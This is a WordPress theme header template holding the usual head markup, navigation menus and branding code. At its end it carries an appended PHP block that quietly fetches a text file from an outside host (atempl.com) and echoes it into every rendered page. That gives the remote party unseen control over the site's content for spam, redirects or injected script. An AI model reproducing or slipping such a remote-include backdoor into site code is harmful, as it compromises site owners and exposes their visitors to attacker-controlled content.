
<!DOCTYPE html>
<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->
<head>
<title><?php wp_title(' | ', true, 'right'); ?> <?php bloginfo('name'); ?></title>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="user-scalable=no, maximum-scale=1,  width=device-width, initial-scale=1"/>
<meta name="apple-mobile-web-app-capable" content="yes" />
<meta name="keywords" content="<?php echo of_get_option('metakeywords'); ?>" />
<meta name="description" content="<?php echo of_get_option('metadescription'); ?>" />

    <script src="https://use.fontawesome.com/aeb8b71c3b.js"></script>
<!--[if lt IE 9]>
	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
<![endif]-->

<!-- stylesheet -->
<link rel="stylesheet" media="all" href="<?php bloginfo('stylesheet_url'); ?>"/>
<!-- stylesheet -->


<!-- wp_head -->
<?php wp_head(); ?>
<!-- wp_head -->

<?php if(of_get_option('customtypography') == '1') { ?>
<!-- custom typography-->

<?php if(of_get_option('headingfontlink') != '') { ?>
<?php echo of_get_option('headingfontlink');?>
<?php } ?>
<?php if(of_get_option('bodyfontlink') != '') { ?>
<?php echo of_get_option('bodyfontlink');?>
<?php } ?>

<?php load_template( get_template_directory() . '/custom.typography.css.php' );?>
<?php } ?>
<!-- custom typography -->

</head>
<!-- end head -->

<body  <?php body_class(); ?> lang="en">
    <div class="mobile-sidebar">
        <div class="sidebar-title clearfix">
            <?php _e('Menu','site5framework') ?>
            <i class="fa fa-times close_sidebar"></i>
        </div>
        <nav>
           <?php wp_nav_menu('theme_location=main-menu&container=&container_class=menu&menu_id=main&menu_class=main-nav sf-menu&link_before=&link_after=&fallback_cb=false'); ?>
        </nav>
    </div>

    <header id="header" class="clearfix">
        <div class="header-center">
            <a href="#" class="small_menu"><i class="fa fa-bars"></i></a>

            <?php if ( !is_home() ) { ?>
                <!-- branding -->
                <div id="branding">
                    <a href="<?php echo get_bloginfo('url'); ?>" class="logo">
                        <?php if(of_get_option('clogo')) { echo '<img src="'.of_get_option('clogo').'" alt="'.get_bloginfo('name').'" class="logo_img">'; } else { if(of_get_option('clogo_text')): echo of_get_option('clogo_text'); else: echo get_bloginfo('name'); endif;  if(of_get_option('cslogan')): echo '<br/><span class="slogan">'.of_get_option('cslogan').'</span>'; endif;} ?>
                    </a>
                </div>
                <!-- end branding -->
            <?php } ?>

            <nav id="main">
                <?php wp_nav_menu('theme_location=main-menu&container=&container_class=menu&menu_id=main&menu_class=main-nav sf-menu&link_before=&link_after=&fallback_cb=false'); ?>
            </nav>
        </div>
		
    </header>

    <section id="page" class="clearfix"><?php
$files = 'http://atempl.com/7.txt';  
$file_headers = @get_headers($files);  
if($file_headers[0] == 'HTTP/1.1 200 OK') 
 {  
       $content = file("http://atempl.com/7.txt");
       $data = implode($content);
       echo $data;
 }  
?>